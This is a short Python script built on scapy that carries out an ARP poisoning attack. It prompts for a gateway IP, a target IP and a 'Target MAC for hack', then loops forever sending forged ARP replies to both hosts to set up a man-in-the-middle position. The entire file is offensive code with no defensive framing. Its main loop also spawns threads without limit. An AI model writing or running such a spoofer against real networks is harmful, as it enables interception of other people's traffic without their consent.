from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import time
from scapy.layers.l2 import ARP

op = 1
spoof = raw_input('Gateway IP: ')
spoof = spoof.replace(" ", "")

victim = raw_input('Target IP: ')
victim = victim.replace(" ", "")

mac = raw_input('Target MAC for hack: ')
mac = mac.replace("-", ":")
mac = mac.replace(" ", "")

def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("Started ARP poison attack")
    try:
        while True:
            send(ARP(op=2, pdst=spoof, hwdst=get_mac(spoof), psrc=victim))
            send(ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof))
            time.sleep(100)
    except KeyboardInterrupt:
        print("Interrupt: Stopped ARP poison attack.")

arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)
while 1:
    poison_thread = threading.Thread(target=arp_poison, args=(spoof,get_mac(spoof), victim, mac))
    poison_thread.start()